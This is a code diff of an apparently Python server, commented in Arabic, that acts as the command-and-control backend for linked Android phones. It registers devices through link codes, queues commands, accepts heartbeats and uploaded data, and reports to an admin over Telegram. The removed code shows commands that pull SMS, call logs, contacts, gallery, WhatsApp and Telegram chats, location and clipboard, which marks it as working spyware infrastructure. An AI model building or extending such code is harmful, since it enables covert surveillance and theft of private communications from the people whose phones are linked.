@@ -541,20 +541,30 @@ async def firebase_get(path):
 
 
 async def firebase_set(path, data):
-    """SET data in Firebase RTDB - with optional Database Secret auth."""
+    """SET data in Firebase RTDB - with optional Database Secret auth.
+    If data is None, uses DELETE instead of PUT (to properly remove the key)."""
     try:
         url = f"{FIREBASE_RTDB_URL}/{path}.json"
         if FIREBASE_DB_SECRET:
             url += f"?auth={FIREBASE_DB_SECRET}"
         session = get_tg_session()
-        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-            ok = resp.status in (200, 204)
-            if ok:
-                log.debug("Firebase SET %s OK", path)
-            else:
-                body = await resp.text()
-                log.warning("Firebase SET %s failed: status=%d body=%s", path, resp.status, body[:200])
-            return ok
+        if data is None:
+            # حذف المسار بدلاً من تعيينه إلى null
+            async with session.delete(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                ok = resp.status in (200, 204)
+                if not ok:
+                    body = await resp.text()
+                    log.warning("Firebase DELETE %s failed: status=%d body=%s", path, resp.status, body[:200])
+                return ok
+        else:
+            async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                ok = resp.status in (200, 204)
+                if ok:
+                    log.debug("Firebase SET %s OK", path)
+                else:
+                    body = await resp.text()
+                    log.warning("Firebase SET %s failed: status=%d body=%s", path, resp.status, body[:200])
+                return ok
     except Exception as exc:
         log.error("Firebase SET %s failed: %s", path, exc)
         return False
@@ -1588,25 +1598,43 @@ async def api_verify_link(request):
 
 
 async def api_register(request):
-    """POST /api/register - Register device with server."""
+    """POST /api/register - Register device with server.
+    يدعم شكلين:
+    1. الجديد (التطبيق): {device_id, device_name, device_model, brand, os_version, battery, link_code}
+    2. القديم: {device_id, link_code, device_info: {name, model, os, ...}}
+    """
     global api_hits
     api_hits += 1
     try:
         body = await request.json()
         device_id = body.get("device_id", "")
         link_code = body.get("link_code", "").upper().strip()
-        device_token = body.get("device_token", "")
-        device_info = body.get("device_info", {})
         
         if not device_id or not link_code:
-            return web.json_response({"ok": False, "error": "device_id and link_code required"}, status=400)
+            return web.json_response({"ok": False, "success": False, "error": "device_id and link_code required"}, status=400)
         
-        # Verify code again
+        # التحقق من الكود
         result = await verify_link_code(link_code)
         if not result["ok"]:
-            return web.json_response(result, status=400)
+            resp = dict(result)
+            resp["success"] = False
+            return web.json_response(resp, status=400)
         
-        # Register device
+        # استخراج بيانات الجهاز - يدعم الشكلين
+        device_info = body.get("device_info", {})
+        if not device_info:
+            # الشكل الجديد من التطبيق (حقول مسطحة)
+            device_info = {
+                "name": body.get("device_name", device_id),
+                "model": body.get("device_model", ""),
+                "os": body.get("os_version", ""),
+                "battery": body.get("battery", ""),
+                "brand": body.get("brand", ""),
+            }
+        
+        device_token = body.get("device_token", "")
+        
+        # تسجيل الجهاز
         device_data = {
             "id": device_id,
             "token": device_token or secrets.token_urlsafe(32),
@@ -1615,31 +1643,34 @@ async def api_register(request):
             "model": device_info.get("model", ""),
             "os": device_info.get("os", ""),
             "battery": device_info.get("battery", ""),
-            "network": device_info.get("network", ""),
-            "location": device_info.get("location", ""),
+            "brand": device_info.get("brand", ""),
+            "network": "",
+            "location": "",
         }
         add_device(device_data)
         await consume_link_code(link_code, device_id)
         
-        # Notify admin
+        # إشعار الأدمن
         await send_admin(
-            f"📱 <b>New Device Linked!</b>\n\n"
-            f"📱 Name: <code>{device_data['name']}</code>\n"
-            f"🆔 ID: <code>{device_id}</code>\n"
-            f"📱 Model: <code>{device_data['model']}</code>\n"
-            f"🤖 OS: <code>{device_data['os']}</code>",
+            f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
+            f"📱 الاسم: <code>{device_data['name']}</code>\n"
+            f"🆔 المعرف: <code>{device_id}</code>\n"
+            f"📱 الموديل: <code>{device_data['model']}</code>\n"
+            f"🤖 النظام: <code>{device_data['os']}</code>",
             reply_markup=build_main_menu()
         )
         
         return web.json_response({
             "ok": True,
+            "success": True,
             "device_id": device_id,
+            "device_token": device_data["token"],
             "token": device_data["token"],
-            "message": "Device registered successfully",
+            "message": "تم تسجيل الجهاز بنجاح",
         })
     except Exception as exc:
         log.error("register error: %s", exc)
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
 
 
 async def api_get_commands(request):
@@ -1681,7 +1712,8 @@ async def api_get_commands(request):
 
 async def api_command_result(request):
     """POST /api/command_result/{command_id} - Submit command result.
-    Also supports query param: POST /api/command_result?command_id=X"""
+    ⚠️ لا يتم إعادة الإرسال - التطبيق يرسل النتائج مباشرة عبر TelegramDirectClient
+    """
     global api_hits
     api_hits += 1
     cmd_id = request.match_info.get("command_id", "")
@@ -1697,27 +1729,40 @@ async def api_command_result(request):
         if not updated:
             return web.json_response({"ok": False, "error": "Command not found"}, status=404)
         
-        # Forward result to admin
-        cmd_name = updated.get("command", "")
+        # تحديث حالة الجهاز
         device_id = updated.get("device_id", "")
-        d = find_device(device_id)
-        dev_name = d.get("name", device_id) if d else device_id
+        if device_id:
+            update_device(device_id, {"active": True})
         
-        result_text = str(result)[:3000] if result else "\u0644\u0627 \u062a\u0648\u062c\u062f \u0628\u064a\u0627\u0646\u0627\u062a"
-        await send_admin(
-            f"✅ <b>Command Result</b>\n\n"
-            f"📱 Device: <code>{dev_name}</code>\n"
-            f"📋 Command: <code>{cmd_name}</code>\n"
-            f"🆔 ID: <code>{cmd_id}</code>\n"
-            f"📊 Status: <code>{status}</code>\n\n"
-            f"📦 Result:\n<code>{result_text}</code>",
-            disable_notification=True
-        )
+        log.info("Result saved: cmd=%s status=%s (no forward)", cmd_id, status)
         
-        return web.json_response({"ok": True, "message": "Result received"})
+        return web.json_response({"ok": True, "success": True, "message": "Result received"})
     except Exception as exc:
         log.error("command_result error: %s", exc)
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+
+
+async def api_heartbeat(request):
+    """POST /api/heartbeat - Receive heartbeat from device."""
+    global api_hits
+    api_hits += 1
+    try:
+        body = await request.json()
+        device_id = body.get("device_id", "")
+        status_val = body.get("status", "online")
+        battery = body.get("battery", 0)
+        
+        if device_id:
+            update_device(device_id, {
+                "active": status_val == "online",
+                "battery": str(battery),
+            })
+            log.info("Heartbeat from %s: battery=%d%% status=%s", device_id, battery, status_val)
+        
+        return web.json_response({"ok": True, "success": True, "message": "Heartbeat received"})
+    except Exception as exc:
+        log.error("heartbeat error: %s", exc)
+        return web.json_response({"ok": True, "success": True})  # لا نريد فشل الـ heartbeat
 
 
 async def api_device_data(request):
@@ -1774,10 +1819,38 @@ async def api_device_data(request):
         
         append_event(f"Data received: {data_type}", {"device_id": device_id})
         
-        return web.json_response({"ok": True, "message": "Data received"})
+        return web.json_response({"ok": True, "success": True, "message": "Data received"})
     except Exception as exc:
         log.error("device_data error: %s", exc)
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+
+
+async def api_device_data_body(request):
+    """POST /api/data - Receive data from device (body contains device_id).
+    يدعم الشكل الذي يرسله التطبيق: {device_id, command, data, timestamp}"""
+    global api_hits
+    api_hits += 1
+    try:
+        body = await request.json()
+        device_id = body.get("device_id", "")
+        command = body.get("command", "")
+        data = body.get("data", {})
+        
+        if not device_id:
+            return web.json_response({"ok": False, "success": False, "error": "device_id required"}, status=400)
+        
+        d = find_device(device_id)
+        if not d:
+            return web.json_response({"ok": False, "success": False, "error": "Device not found"}, status=404)
+        
+        update_device(device_id, {"active": True})
+        append_event(f"Data received: {command}", {"device_id": device_id})
+        
+        log.info("Data received (body) from %s: command=%s", device_id, command)
+        return web.json_response({"ok": True, "success": True, "message": "Data received"})
+    except Exception as exc:
+        log.error("device_data_body error: %s", exc)
+        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
 
 
 async def api_device_settings(request):
@@ -2538,9 +2611,13 @@ async def tg_poll_loop():
 # ============================================================================
 
 async def firebase_result_listener():
-    """Background task: Poll Firebase for results from Android app and forward to Telegram."""
+    """Background task: Poll Firebase for results from Android app.
+    
+    ⚠️ تم تعطيل إعادة الإرسال - التطبيق يرسل النتائج مباشرة عبر TelegramDirectClient
+    هذه الدالة الآن تكتفي بتحديث حالة الأمر وتنظيف Firebase فقط.
+    """
     global _processed_results
-    log.info("Firebase result listener started")
+    log.info("Firebase result listener started (passive mode - no forwarding)")
     while polling_active:
         try:
             results_data = await firebase_get("results")
@@ -2552,7 +2629,7 @@ async def firebase_result_listener():
                         if not isinstance(result_entry, dict):
                             continue
 
-                        # === Deduplication: skip already processed results ===
+                        # === منع تكرار المعالجة ===
                         result_key = f"{device_id}:{cmd_id}"
                         if result_key in _processed_results:
                             continue
@@ -2561,97 +2638,25 @@ async def firebase_result_listener():
                         result_text = result_entry.get("result", "")
                         command = result_entry.get("command", "")
 
-                        # Find device name
-                        d = find_device(device_id)
-                        dev_name = d.get("name", device_id) if d else device_id
+                        # تحديث حالة الأمر محلياً فقط (بدون إرسال رسالة)
+                        update_command_status(cmd_id, status, result_text)
 
-                        # Find command registry entry
-                        reg = None
-                        for key, val in COMMAND_REGISTRY.items():
-                            if val.get("cmd") == command:
-                                reg = val
-                                break
-                        desc = reg.get("desc", command) if reg else command
-                        emoji = reg.get("emoji", "📋") if reg else "📋"
+                        # تحديث وقت ظهور الجهاز
+                        update_device(device_id, {"active": True})
 
-                        # === Smart formatting based on command type ===
-                        data_commands = {"get_sms", "get_calls", "get_contacts", "get_gallery", 
-                                        "get_notifications", "get_apps", "get_installed_apps",
-                                        "get_running_apps", "get_whatsapp", "get_telegram",
-                                        "get_all", "get_location", "get_clipboard"}
+                        # تنظيف Firebase فوراً لمنع التكرار
+                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
 
-                        if command in data_commands:
-                            # Data commands: app already sends formatted file via TelegramDirectClient
-                            # Just send brief confirmation
-                            try:
-                                result_json = json.loads(result_text) if result_text else {}
-                                count = result_json.get("count", 0)
-                                ok = result_json.get("ok", False)
-                                if ok and count:
-                                    msg = (f"{emoji} <b>تم جمع البيانات</b>\n\n"
-                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                           f"📋 الأمر: <code>{desc}</code>\n"
-                                           f"📊 عدد العناصر: <b>{count}</b>\n\n"
-                                           f"✅ تم إرسال البيانات كملف منفصل")
-                                elif ok:
-                                    msg = (f"{emoji} <b>تم تنفيذ الأمر</b>\n\n"
-                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                           f"📋 الأمر: <code>{desc}</code>\n\n"
-                                           f"✅ تم بنجاح")
-                                else:
-                                    error_msg = result_json.get("error", "خطأ غير معروف")
-                                    msg = (f"{emoji} <b>فشل تنفيذ الأمر</b>\n\n"
-                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                           f"📋 الأمر: <code>{desc}</code>\n\n"
-                                           f"❌ {error_msg}")
-                            except Exception:
-                                msg = (f"{emoji} <b>نتيجة الأمر</b>\n\n"
-                                       f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                       f"📋 الأمر: <code>{desc}</code>\n"
-                                       f"📊 الحالة: <code>{status}</code>")
-                        else:
-                            # Execution commands: show the actual result
-                            try:
-                                result_json = json.loads(result_text) if result_text else {}
-                                ok = result_json.get("ok", False)
-                                message = result_json.get("message", result_json.get("error", ""))
-                                if ok:
-                                    display = message if message else result_text[:500]
-                                    msg = (f"{emoji} <b>تم تنفيذ الأمر</b>\n\n"
-                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                           f"📋 الأمر: <code>{desc}</code>\n\n"
-                                           f"✅ {display}")
-                                else:
-                                    display = message if message else (result_text[:500] if result_text else "فشل التنفيذ")
-                                    msg = (f"{emoji} <b>فشل تنفيذ الأمر</b>\n\n"
-                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                           f"📋 الأمر: <code>{desc}</code>\n\n"
-                                           f"❌ {display}")
-                            except Exception:
-                                display_result = str(result_text)[:500] if result_text else "لا توجد بيانات"
-                                msg = (f"{emoji} <b>نتيجة الأمر</b>\n\n"
-                                       f"📱 الجهاز: <code>{dev_name}</code>\n"
-                                       f"📋 الأمر: <code>{desc}</code>\n\n"
-                                       f"📦 <code>{display_result}</code>")
-
-                        await send_admin(msg, disable_notification=True)
-
-                        # Mark as processed
+                        # تسجيل في مجموعة المعالجة
                         _processed_results.add(result_key)
                         if len(_processed_results) > 500:
                             _processed_results = set(list(_processed_results)[-200:])
 
-                        # Delete from Firebase after forwarding
-                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
-
-                        # Also update local command status
-                        update_command_status(cmd_id, status, result_text)
-
-                        log.info("Result forwarded: cmd=%s device=%s status=%s", cmd_id, device_id, status)
+                        log.info("Result processed (no forward): cmd=%s device=%s command=%s status=%s", cmd_id, device_id, command, status)
         except Exception as exc:
             log.error("Firebase result listener error: %s", exc)
 
-        await asyncio.sleep(3)
+        await asyncio.sleep(5)
 
 
 # ============================================================================
@@ -2719,6 +2724,8 @@ def create_app():
     app.router.add_get("/api/commands", api_get_commands)
     app.router.add_post("/api/command_result/{command_id}", api_command_result)
     app.router.add_post("/api/data/{device_id}", api_device_data)
+    app.router.add_post("/api/data", api_device_data_body)
+    app.router.add_post("/api/heartbeat", api_heartbeat)
     app.router.add_get("/api/settings/{device_id}", api_device_settings)
     
     # Web API (requires auth)
